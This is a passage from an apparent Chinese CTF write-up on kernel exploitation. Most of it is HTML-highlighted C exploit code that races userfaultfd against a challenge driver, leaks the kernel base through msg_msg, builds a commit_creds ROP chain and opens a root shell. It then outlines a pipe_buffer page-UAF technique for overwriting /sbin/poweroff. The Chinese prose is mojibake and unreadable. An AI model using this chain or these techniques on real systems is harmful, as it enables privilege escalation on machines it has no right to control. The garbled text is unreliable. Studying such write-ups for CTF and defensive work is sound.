&amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    m_type;</span><br><span class="line">    <span class="type">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">getMsgQueue</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">readMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * the msgp should be a pointer to the `struct msgbuf`,</span></span><br><span class="line"><span class="comment"> * and the data should be stored in msgbuf.mtext</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">writeMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span>&#123;</span><br><span class="line">    ((<span class="keyword">struct</span> msgbuf*)msgp)-&gt;mtype = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">peekMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp,</span><br><span class="line">                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMsg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">uint64_t</span> m_list_next, <span class="type">uint64_t</span> m_list_prev,</span></span><br><span class="line"><span class="params">              <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts,  <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span>&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            heap_addr = *(<span class="type">size_t</span>*)vuln.e;</span><br><span class="line">            hexx(<span class="string">&quot;heap_addr&quot;</span>, heap_addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">sem_t</span> sem_write, sem_free;</span><br><span class="line"><span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> uffd_buf[<span class="number">0x200</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span>* uffd_buf, <span class="type">pthread_t</span> pthread_moniter, <span class="type">void</span>* handler)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line"> </span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_NONBLOCK|O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) err_exit(<span class="string">&quot;syscall for userfaultfd ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_API ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)uffd_buf;</span><br><span class="line">    uffdio_register.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_REGISTER ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> res = pthread_create(&amp;pthread_moniter, <span class="literal">NULL</span>, handler, uffd);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) err_exit(<span class="string">&quot;pthread_create ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hijack_handler</span><span class="params">(<span class="type">void</span> *args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd = (<span class="type">int</span>)args;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="keyword">if</span> (poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec poll for leak_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> res = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;ERROR on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            err_exit(<span class="string">&quot;INCORRET EVENT in leak_handler&quot;</span>);</span><br><span class="line">        <span class="comment">// operation</span></span><br><span class="line">        info(<span class="string">&quot;hijack the kernel in userfaultfd -- hijack_handler&quot;</span>);</span><br><span class="line">        del();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(msg_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg_buf));</span><br><span class="line">        <span class="type">int</span> ret = writeMsg(msg_qid, msg_buf, <span class="number">0x400</span> - <span class="number">0x30</span>, <span class="number">0x1337</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;Write msg.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uffd_buf[<span class="number">0</span>] = heap_addr - <span class="number">0x7bc00</span> + <span class="number">0xc8</span>;</span><br><span class="line">        uffd_buf[<span class="number">1</span>] = heap_addr - <span class="number">0x7bb40</span>;</span><br><span class="line">        uffd_buf[<span class="number">2</span>] = <span class="number">0x1337</span>;</span><br><span class="line">        uffd_buf[<span class="number">3</span>] = <span class="number">0x1000</span>;</span><br><span class="line">        uffd_buf[<span class="number">4</span>] = heap_addr + <span class="number">0x300</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[<span class="number">1</span>], <span class="string">&quot;stas&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;write pipe.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[0]&quot;</span>, uffd_buf[<span class="number">0</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[1]&quot;</span>, uffd_buf[<span class="number">1</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[2]&quot;</span>, uffd_buf[<span class="number">2</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[3]&quot;</span>, uffd_buf[<span class="number">3</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[4]&quot;</span>, uffd_buf[<span class="number">4</span>]);</span><br><span class="line">        </span><br><span class="line">        uffdio_copy.src = uffd_buf;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = <span class="number">0x1000</span>;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec ioctl for UFFDIO_COPY in leak_handler&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_shell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* to exit the process normally, instead of segmentation fault */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> get_root_func = (<span class="type">size_t</span>)get_root_shell;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> data[<span class="number">0x1100</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ksctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vuln.msg = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(vuln.msg, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    msg_qid = getMsgQueue();</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line">    ptr = heap_addr;</span><br><span class="line">    hexx(<span class="string">&quot;ptr&quot;</span>, ptr);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> pwn;</span><br><span class="line">    <span class="type">char</span> *uffd_buf_hijack = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(uffd_buf_hijack, &amp;pwn, hijack_handler);</span><br><span class="line"></span><br><span class="line">    write(fd,uffd_buf_hijack, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (readMsg(msg_qid, data, <span class="number">0x1000</span>, <span class="number">0x1337</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;read msg.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    binary_dump(<span class="string">&quot;leak data + 0x300&quot;</span>, data + <span class="number">0x300</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;leak, &amp;data[<span class="number">0x3e8</span>], <span class="number">8</span>);</span><br><span class="line">    hexx(<span class="string">&quot;leak&quot;</span>, leak);</span><br><span class="line">    kernel_base = leak - <span class="number">0x101a740</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_base&quot;</span>, kernel_base);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line">    magic_gadget += kernel_offset;</span><br><span class="line">    hexx(<span class="string">&quot;modprobe_path&quot;</span>, modprobe_path);</span><br><span class="line">    hexx(<span class="string">&quot;magic_gadget&quot;</span>, magic_gadget);</span><br><span class="line">    </span><br><span class="line">    init_creds = kernel_base + <span class="number">0x1448cc0</span>;</span><br><span class="line">    commit_creds = kernel_base + <span class="number">0x97d00</span>;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="number">49</span>;</span><br><span class="line">    hexx(<span class="string">&quot;commit_creds&quot;</span>, commit_creds);</span><br><span class="line">    hexx(<span class="string">&quot;work_for_cpu_fn&quot;</span>, work_for_cpu_fn);</span><br><span class="line">    hexx(<span class="string">&quot;swapgs_restore_regs_and_return_to_usermode&quot;</span>, swapgs_restore_regs_and_return_to_usermode);</span><br><span class="line"></span><br><span class="line">    pop_rdi = kernel_base + <span class="number">0xe031</span>;</span><br><span class="line">    add_rsp_188_pop_rbx_ret = kernel_base + <span class="number">0x9369cc</span>;</span><br><span class="line">    add_rsp += kernel_offset;</span><br><span class="line">    hexx(<span class="string">&quot;add_rsp_188_pop_rbx_ret&quot;</span>,add_rsp_188_pop_rbx_ret);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> index = <span class="number">0x20</span>;</span><br><span class="line">    payload[index++] = add_rsp;</span><br><span class="line">    payload[index++] = <span class="number">0x800000000</span>;</span><br><span class="line">    payload[index++] = ptr + <span class="number">0x400</span> + <span class="number">0x10</span>;</span><br><span class="line">    payload[index++] = magic_gadget;</span><br><span class="line">    payload[index++] = <span class="number">0</span>;</span><br><span class="line">    payload[index++] = pop_rdi;</span><br><span class="line">    payload[index++] = init_creds;</span><br><span class="line">    payload[index++] = commit_creds;</span><br><span class="line">    payload[index++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">    payload[index++] = <span class="number">0</span>;</span><br><span class="line">    payload[index++] = <span class="number">0</span>;</span><br><span class="line">    payload[index++] = get_root_shell;</span><br><span class="line">    payload[index++] = user_cs;</span><br><span class="line">    payload[index++] = user_rflags;</span><br><span class="line">    payload[index++] = user_sp;</span><br><span class="line">    payload[index++] = user_ss;</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line">    write(fd, payload, <span class="number">0x180</span>);</span><br><span class="line"></span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ±‚è§£æ•ˆæœ-1"><a href="#æ±‚è§£æ•ˆæœ-1" class="headerlink" title="æ±‚è§£æ•ˆæœ"></a>æ±‚è§£æ•ˆæœ</h3><img src="/2024/10/07/kno_puts/8.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="userfaultfd-pipe-buffer-page-UAF"><a href="#userfaultfd-pipe-buffer-page-UAF" class="headerlink" title="userfaultfd + pipe_buffer  + page UAF"></a>userfaultfd + pipe_buffer  + page UAF</h2><h3 id="æ€è·¯åˆ†æ-3"><a href="#æ€è·¯åˆ†æ-3" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h3><p>ç°åœ¨æˆ‘ä»¬æ¥å‡è®¾ä¸€ç§æ¯”è¾ƒæç«¯çš„æƒ…å†µï¼Œæˆ‘ä»¬ <code>/sys/kernel/notes</code> ç»™æ‰“äº†è¡¥ä¸æ— æ³•æ³„éœ²åœ°å€ï¼Œè€Œä¸”é¢˜ç›®ä¸å†ç»™å‡ºå †åœ°å€ï¼Œä»¥åŠå†…æ ¸ç¼–è¯‘æ—¶å¼€å¯äº† <code>CONFIG_CFI_CLANG</code>ï¼ˆå¯ä»¥é˜²æ­¢æ”»å‡»è€…è¿›è¡Œ <code>rop</code> æ”»å‡»ï¼‰ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦æˆ‘ä»¬çš„ <code>page uaf</code> ç™»åœºäº†ï¼ï¼ï¼</p><p>è¿™ç©æ„æˆ‘æ˜¯ä» a3 å¸ˆå‚…çš„åšå®¢å­¦çš„ï¼Œååˆ†å»ºè®®æ¯ä½å†…æ ¸çˆ±å¥½è€…å»åå¤é˜…è¯»é‚£ç¯‡æ–‡ç« ï¼š<a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">ã€CTF.0x08ã€‘D^ 3CTF2023 d3kcache å‡ºé¢˜æ‰‹è®° - arttnba3â€™s blog</a>ï¼Œä¸‹é¢ä¼šå€Ÿç”¨ a3 å¸ˆå‚…åšå®¢ä¸­çš„ä¸€äº›å›¾ç‰‡ï¼š-)</p><p>åŒæ ·æ˜¯åˆ©ç”¨ <code>userfaultfd</code> æ¥åˆ¶é€ å‡º <code>uaf</code>ï¼Œç„¶åä¿®æ”¹ <code>pipe buffer</code> çš„ <code>page</code> æŒ‡é’ˆçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œä½¿å…¶å‡ºç°ä¸¤ä¸ª <code>pipe buffer</code> æŒ‡å‘åŒä¸€ä¸ª <code>page</code> çš„æƒ…å†µã€‚</p><img src="/2024/10/07/kno_puts/9.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æ­¤æ—¶é‡Šæ”¾æ‰å…¶ä¸­ä¸€ä¸ª <code>pipe buffer</code>ï¼Œå°±ä¼šç›´æ¥é‡Šæ”¾æ‰ä¸€æ•´ä¸ªé¡µï¼Œå‡ºç°é¡µçº§ <code>UAF</code> ï¼ï¼ï¼</p><img src="/2024/10/07/kno_puts/10.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>åœ¨ <code>gdb</code> ä¸­æ‰€çœ‹åˆ°çš„æƒ…å†µå¦‚ä¸‹ï¼š</p><img src="/2024/10/07/kno_puts/11.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>åé¢çš„æ“ä½œå°±å’Œé¢˜ç›®çš„æœ¬èº«æ²¡æœ‰ä»€ä¹ˆå…³ç³»äº†ï¼ˆå’Œç”¨æˆ·æ€çš„ <code>house of some</code> ä¸€æ ·ğŸ˜‡ï¼‰ã€‚æˆ‘æœ¬æ¥çš„æ€è·¯æ˜¯å°†è¢«é‡Šæ”¾çš„é¡µé‡æ–°å–å‡ºæ¥ç”¨äºå­˜å‚¨å¦ä¸€ä¸ª <code>pipe buffer</code> æ•°ç»„ï¼Œç„¶åä¿®æ”¹å…¶ä¸­ä¸€ä¸ª <code>pipe buffer</code> çš„ <code>flag</code> ä¸º <code>0x10</code>ï¼Œå®ç°ä»»æ„æ–‡ä»¶çš„è¶Šæƒå†™å…¥ã€‚å¯æ˜¯å–·äº†åŠå¤©ä¹Ÿæ²¡æˆåŠŸçš„å‘½ä¸­ã€‚ç„¶åçœ‹åˆ°äº† tplus å¸ˆå‚…çš„ wpï¼Œå…¶æ€è·¯æ›´åŠ çš„ç®€å•ï¼Œå³åˆ¶é€ å‡º <code>page uaf</code> åä¸æ–­çš„å–·å°„ <code>target file</code>ï¼ˆåå¤ openï¼‰ï¼Œç„¶åä¿®æ”¹ <code>file â†’ f_mode</code>ï¼Œä¹Ÿèƒ½å®ç°è¶Šæƒå†™ä»»æ„æ–‡ä»¶ã€‚</p><p>æœ‰äº†è¶Šæƒå†™ä»»æ„æ–‡ä»¶åæˆ‘æ˜¯æƒ³ç€å†™ <code>/etc/passwd </code>æ–‡ä»¶ï¼Œå¯æ˜¯è¿™é“é¢˜ç›®æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶å†åŠ ä¸Šæˆ‘ä¹Ÿä¸æ˜¯å¾ˆç†Ÿæ‚‰è¿™ä¸ªä¸œè¥¿ï¼Œäºæ˜¯æˆ‘é€‰ç€ä¿®æ”¹ <code>/sbin/poweroff</code>ã€‚åº”ä¸ºè¿™ä¸ªæ–‡ä»¶æ˜¯è¿æ¥ç€ <code>busybox</code> çš„ã€‚å½“ <code>qemu</code> å…³é—­çš„æ—¶å€™ä¼šä»¥ <code>root</code> æƒé™æ¥æŒ‡å‘è¿™ä¸ªæ–‡ä»¶ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥å°† <code>poweroff</code> æ–‡ä»¶ä¿®æ”¹ä¸º <code>readflag</code>ï¼Œç„¶åè¾“å…¥ <code>exit</code> å³å¯ç±»ä¼¼äºç”¨æˆ·æ€çš„ <code>orw</code> ä¸€æ ·è·å– <code>flag</code></p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span 